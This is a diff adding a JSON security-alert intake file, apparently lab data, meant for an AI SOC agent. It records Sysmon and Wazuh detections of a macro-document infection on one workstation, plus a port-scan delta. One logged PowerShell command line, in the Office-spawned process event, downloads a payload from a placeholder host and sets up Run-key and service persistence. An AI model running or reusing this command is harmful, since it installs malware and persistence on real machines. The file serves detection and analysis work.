@@ -1,0 +1,296 @@
+{
+  "schema": "talonsoclab.soc-intake/v3",
+  "generated": "2026-08-17T15:00:00Z",
+  "source": "talonsoclab",
+  "consumer": "casa-ai-agent (github.com/ktalons/casa-ai-agent)",
+  "window": {
+    "start": "2026-08-16T15:00:00Z",
+    "end": "2026-08-17T15:00:00Z",
+    "lookback_hours": 24
+  },
+  "filter": {
+    "min_level": 10,
+    "include_rule_ids": [
+      "100938"
+    ],
+    "cap": 200,
+    "order": "newest_first"
+  },
+  "truncated": false,
+  "counts": [
+    {
+      "date": "2026-08-16",
+      "matched": 5,
+      "included": 5
+    },
+    {
+      "date": "2026-08-17",
+      "matched": 0,
+      "included": 0
+    }
+  ],
+  "pipeline": {
+    "collector_ok": true,
+    "agents_reporting": 6,
+    "last_event_seen": "2026-08-17T14:59:27.064Z"
+  },
+  "detections": [
+    {
+      "level": 10,
+      "description": "Sysmon: executable under a ProgramData subfolder started by services.exe",
+      "rule_id": "100936",
+      "agent": "corpws58",
+      "mitre": [
+        "T1543.003"
+      ],
+      "timestamp": "2026-08-16T19:42:21.587Z",
+      "alert_id": "1786909341.000211",
+      "tactic": [
+        "persistence",
+        "privilege-escalation"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "process_creation"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100936",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "1",
+      "sysmon": {
+        "process_create": {
+          "image": "C:\\ProgramData\\WinSvcCache\\svcupd.exe",
+          "command_line": "C:\\ProgramData\\WinSvcCache\\svcupd.exe",
+          "parent_image": "C:\\Windows\\System32\\services.exe",
+          "parent_command_line": "C:\\Windows\\system32\\services.exe",
+          "process_id": 4472,
+          "parent_process_id": 712,
+          "process_guid": "{9c4e2a17-3d64-66bf-a703-000000003b00}",
+          "parent_process_guid": "{9c4e2a17-0a11-66bf-0b00-000000003b00}",
+          "user": "NT AUTHORITY\\SYSTEM",
+          "integrity_level": "System",
+          "current_directory": "C:\\Windows\\system32\\",
+          "hashes": {
+            "md5": null,
+            "sha1": null,
+            "sha256": "6e1d0b9f4a2c87e35d90b4f1c27a6e8d3b5f09a1c4e7d2b8a6f3c0e9d1b4a7c2",
+            "imphash": "b3f7a91c0d4e62f8a5c1e9d07b2f4a63"
+          }
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 12,
+      "description": "Windows service installed with an auto-start image under a ProgramData subfolder: WinSvcCache, C:\\ProgramData\\WinSvcCache\\svcupd.exe, start type auto start",
+      "rule_id": "100939",
+      "agent": "corpws58",
+      "mitre": [
+        "T1543.003"
+      ],
+      "timestamp": "2026-08-16T19:42:20.044Z",
+      "alert_id": "1786909340.000212",
+      "tactic": [
+        "persistence",
+        "privilege-escalation"
+      ],
+      "groups": [
+        "windows",
+        "system",
+        "service_installed"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100939",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "7045",
+      "sysmon": null,
+      "suricata": null
+    },
+    {
+      "level": 12,
+      "description": "Sysmon: Run key value set to an executable under a ProgramData subfolder",
+      "rule_id": "100937",
+      "agent": "corpws58",
+      "mitre": [
+        "T1547.001"
+      ],
+      "timestamp": "2026-08-16T19:42:18.412907Z",
+      "alert_id": "1786909338.000213",
+      "tactic": [
+        "persistence",
+        "privilege-escalation"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "registry"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100937",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "13",
+      "sysmon": {
+        "registry_value_set": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "process_id": 8156,
+          "process_guid": "{9c4e2a17-3d5b-66bf-9e03-000000003b00}",
+          "user": "CORP\\u-eng58",
+          "event_type": "SetValue",
+          "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSvcCache",
+          "details": "C:\\ProgramData\\WinSvcCache\\svcupd.exe"
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 7,
+      "description": "Sysmon: executable file written under a ProgramData subfolder",
+      "rule_id": "100938",
+      "agent": "corpws58",
+      "mitre": [
+        "T1105"
+      ],
+      "timestamp": "2026-08-16T19:42:17.950663Z",
+      "alert_id": "1786909337.000214",
+      "tactic": [
+        "command-and-control"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "file_creation"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100938",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "11",
+      "sysmon": {
+        "file_create": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "process_id": 8156,
+          "process_guid": "{9c4e2a17-3d5b-66bf-9e03-000000003b00}",
+          "user": "CORP\\u-eng58",
+          "target_filename": "C:\\ProgramData\\WinSvcCache\\svcupd.exe"
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 12,
+      "description": "Sysmon: Office application spawned PowerShell with a hidden window",
+      "rule_id": "100935",
+      "agent": "corpws58",
+      "mitre": [
+        "T1204.002",
+        "T1059.001"
+      ],
+      "timestamp": "2026-08-16T19:42:15.208311Z",
+      "alert_id": "1786909335.000215",
+      "tactic": [
+        "execution"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "process_creation"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100935",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "1",
+      "sysmon": {
+        "process_create": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -nop -w hidden -ep bypass -c \"New-Item -ItemType Directory C:\\ProgramData\\WinSvcCache -Force | Out-Null; iwr https://dl.media-share.test/q/p.bin -OutFile C:\\ProgramData\\WinSvcCache\\svcupd.exe; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -Name WinSvcCache -Value C:\\ProgramData\\WinSvcCache\\svcupd.exe; sc.exe create WinSvcCache binPath= C:\\ProgramData\\WinSvcCache\\svcupd.exe start= auto; sc.exe start WinSvcCache\"",
+          "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "parent_command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\u-eng58\\Downloads\\shipping-notice-0816.docm\" /o \"\"",
+          "process_id": 8156,
+          "parent_process_id": 6024,
+          "process_guid": "{9c4e2a17-3d5b-66bf-9e03-000000003b00}",
+          "parent_process_guid": "{9c4e2a17-3d58-66bf-8a03-000000003b00}",
+          "user": "CORP\\u-eng58",
+          "integrity_level": "High",
+          "current_directory": "C:\\Users\\u-eng58\\Documents\\",
+          "hashes": null
+        }
+      },
+      "suricata": null
+    }
+  ],
+  "recon_delta": {
+    "markdown": "## Recon delta — 2026-08-17\n\n- **NEW** `corpws58:9443/tcp` open, service not recognized (TLS handshake, no banner); not present in the 2026-08-10 baseline.\n- Unchanged: `corpws58:135/tcp`, `corpws58:445/tcp`.\n",
+    "baseline": "2026-08-10",
+    "changes": [
+      {
+        "host": "corpws58",
+        "port": 9443,
+        "proto": "tcp",
+        "status": "new"
+      },
+      {
+        "host": "corpws58",
+        "port": 135,
+        "proto": "tcp",
+        "status": "unchanged"
+      },
+      {
+        "host": "corpws58",
+        "port": 445,
+        "proto": "tcp",
+        "status": "unchanged"
+      }
+    ]
+  },
+  "note": "Deterministic intake. Reasoning happens in CASA, not here."
+}
